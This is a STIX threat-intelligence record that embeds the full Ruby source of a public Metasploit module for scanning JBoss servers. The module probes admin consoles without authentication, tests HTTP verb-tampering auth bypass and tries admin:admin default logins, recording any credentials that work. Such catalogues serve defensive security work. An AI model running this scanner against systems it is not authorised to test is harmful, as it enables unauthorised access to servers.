{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fb1cf0a-eb58-4922-9ad4-f8a147eca53f",
    "created": "2024-08-14T16:30:46.936085Z",
    "modified": "2024-08-14T16:30:46.936089Z",
    "name": "JBoss Vulnerability Scanner",
    "description": "( This module scans a JBoss instance for a few vulnerabilities. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jboss_vulnscan.rb",
            "external_id": "jboss_vulnscan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12149#deserialization:\"/invoker/readonly\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                  => 'JBoss Vulnerability Scanner',\n      'Description'           => %q(\n        This module scans a JBoss instance for a few vulnerabilities.\n      ),\n      'Author'                =>\n        [\n          'Tyler Krpata',\n          'Zach Grace <@ztgrace>'\n        ],\n      'References'            =>\n        [\n          [ 'CVE', '2008-3273' ], # info disclosure via unauthenticated access to \"/status\"\n          [ 'CVE', '2010-1429' ], # info disclosure via unauthenticated access to \"/status\" (regression)\n          [ 'CVE', '2010-0738' ], # VERB auth bypass on \"JMX-Console\": /jmx-console/\n          [ 'CVE', '2010-1428' ], # VERB auth bypass on \"Web Console\": /web-console/\n          [ 'CVE', '2017-12149' ] # deserialization: \"/invoker/readonly\"\n        ],\n      'License'               => BSD_LICENSE\n      ))\n\n    register_options(\n      [\n        OptString.new('VERB',  [ true,  \"Verb for auth bypass testing\", \"HEAD\"])\n      ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi(\n      {\n        'uri'       => \"/\" + Rex::Text.rand_text_alpha(12),\n        'method'    => 'GET',\n        'ctype'     => 'text/plain'\n      })\n\n    if res\n\n      info = http_fingerprint(:response => res)\n      print_status(\"#{rhost}:#{rport} Fingerprint: #{info}\")\n\n      if res.body && />(JBoss[^<]+)/.match(res.body)\n        print_error(\"#{rhost}:#{rport} JBoss error message: #{$1}\")\n      end\n\n      apps = [\n        '/jmx-console/HtmlAdaptor',\n        '/jmx-console/checkJNDI.jsp',\n        '/status',\n        '/web-console/ServerInfo.jsp',\n        # apps added per Patrick Hof\n        '/web-console/Invoker',\n        '/invoker/JMXInvokerServlet',\n        '/invoker/readonly'\n      ]\n\n      print_status(\"#{rhost}:#{rport} Checking http...\")\n      apps.each do |app|\n        check_app(app)\n      end\n\n      jboss_as_default_creds\n\n      ports = {\n        # 1098i, 1099, and 4444 needed to use twiddle\n        1098 => 'Naming Service',\n        1099 => 'Naming Service',\n        4444 => 'RMI invoker'\n      }\n      print_status(\"#{rhost}:#{rport} Checking services...\")\n      ports.each do |port, service|\n        status = test_connection(ip, port) == :up ? \"open\" : \"closed\"\n        print_status(\"#{rhost}:#{rport} #{service} tcp/#{port}: #{status}\")\n      end\n    end\n  end\n\n  def check_app(app)\n    res = send_request_cgi({\n      'uri'       => app,\n      'method'    => 'GET',\n      'ctype'     => 'text/plain'\n    })\n\n\n\n    unless res\n      print_status(\"#{rhost}:#{rport} #{app} not found\")\n      return\n    end\n\n    case\n    when res.code == 200\n      print_good(\"#{rhost}:#{rport} #{app} does not require authentication (200)\")\n    when res.code == 403\n      print_status(\"#{rhost}:#{rport} #{app} restricted (403)\")\n    when res.code == 401\n      print_status(\"#{rhost}:#{rport} #{app} requires authentication (401): #{res.headers['WWW-Authenticate']}\")\n      bypass_auth(app)\n      basic_auth_default_creds(app)\n    when res.code == 404\n      print_status(\"#{rhost}:#{rport} #{app} not found (404)\")\n    when res.code == 301, res.code == 302\n      print_status(\"#{rhost}:#{rport} #{app} is redirected (#{res.code}) to #{res.headers['Location']} (not following)\")\n    when res.code == 500 && app == \"/invoker/readonly\"\n      print_good(\"#{rhost}:#{rport} #{app} responded (#{res.code})\")\n    else\n      print_status(\"#{rhost}:#{rport} Don't know how to handle response code #{res.code}\")\n    end\n  end\n\n  def jboss_as_default_creds\n    print_status(\"#{rhost}:#{rport} Checking for JBoss AS default creds\")\n\n    session = jboss_as_session_setup(rhost, rport)\n    return false if session.nil?\n\n    # Default AS creds\n    username = 'admin'\n    password = 'admin'\n\n    res = send_request_raw({\n      'uri'      => '/admin-console/login.seam',\n      'method'   => 'POST',\n      'version'  => '1.1',\n      'vhost'    => \"#{rhost}\",\n      'headers'  => { 'Content-Type'  => 'application/x-www-form-urlencoded',\n                      'Cookie'        => \"JSESSIONID=#{session['jsessionid']}\"\n                    },\n      'data'     => \"login_form=login_form&login_form%3Aname=#{username}&login_form%3Apassword=#{password}&login_form%3Asubmit=Login&javax.faces.ViewState=#{session[\"viewstate\"]}\"\n    })\n\n    # Valid creds if 302 redirected to summary.seam and not error.seam\n    if res && res.code == 302 && res.headers.to_s !~ /error.seam/m && res.headers.to_s =~ /summary.seam/m\n      print_good(\"#{rhost}:#{rport} Authenticated using #{username}:#{password} at /admin-console/\")\n      add_creds(username, password)\n    else\n      print_status(\"#{rhost}:#{rport} Could not guess admin credentials\")\n    end\n  end\n\n  def add_creds(username, password)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'jboss',\n      protocol: 'tcp',\n      workspace_id: framework.db.workspace.id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: password,\n      private_type: :password,\n      username: username\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n    credential_data[:core] = credential_core\n    create_credential_login(credential_data)\n  end\n\n  def jboss_as_session_setup(rhost, rport)\n    res = send_request_raw({\n      'uri'       => '/admin-console/login.seam',\n      'method'    => 'GET',\n      'version'   => '1.1',\n      'vhost'     => \"#{rhost}\"\n    })\n\n    unless res\n      return nil\n    end\n\n    begin\n      viewstate = /javax.faces.ViewState\" value=\"(.*)\" auto/.match(res.body).captures[0]\n      jsessionid = /JSESSIONID=(.*);/.match(res.headers.to_s).captures[0]\n    rescue ::NoMethodError\n      print_status(\"#{rhost}:#{rport} Could not guess admin credentials\")\n      return nil\n    end\n\n    { 'jsessionid' => jsessionid, 'viewstate' => viewstate }\n  end\n\n  def bypass_auth(app)\n    print_status(\"#{rhost}:#{rport} Check for verb tampering (#{datastore['VERB']})\")\n\n    res = send_request_raw({\n      'uri'       => app,\n      'method'    => datastore['VERB'],\n      'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason\n    })\n\n    if res && res.code == 200\n      print_good(\"#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering at #{app}\")\n    else\n      print_status(\"#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering\")\n    end\n  end\n\n  def basic_auth_default_creds(app)\n    res = send_request_cgi({\n      'uri'       => app,\n      'method'    => 'GET',\n      'ctype'     => 'text/plain',\n      'authorization' => basic_auth('admin', 'admin')\n    })\n\n    if res && res.code == 200\n      print_good(\"#{rhost}:#{rport} Authenticated using admin:admin at #{app}\")\n      add_creds(\"admin\", \"admin\")\n    else\n      print_status(\"#{rhost}:#{rport} Could not guess admin credentials\")\n    end\n  end\n\n  # function stole'd from mssql_ping\n  def test_connection(ip, port)\n    begin\n      sock = Rex::Socket::Tcp.create(\n        'PeerHost' => ip,\n        'PeerPort' => port,\n        'Timeout' => 20\n      )\n    rescue Rex::ConnectionError\n      return :down\n    end\n    sock.close\n    return :up\n  end\nend\n"
}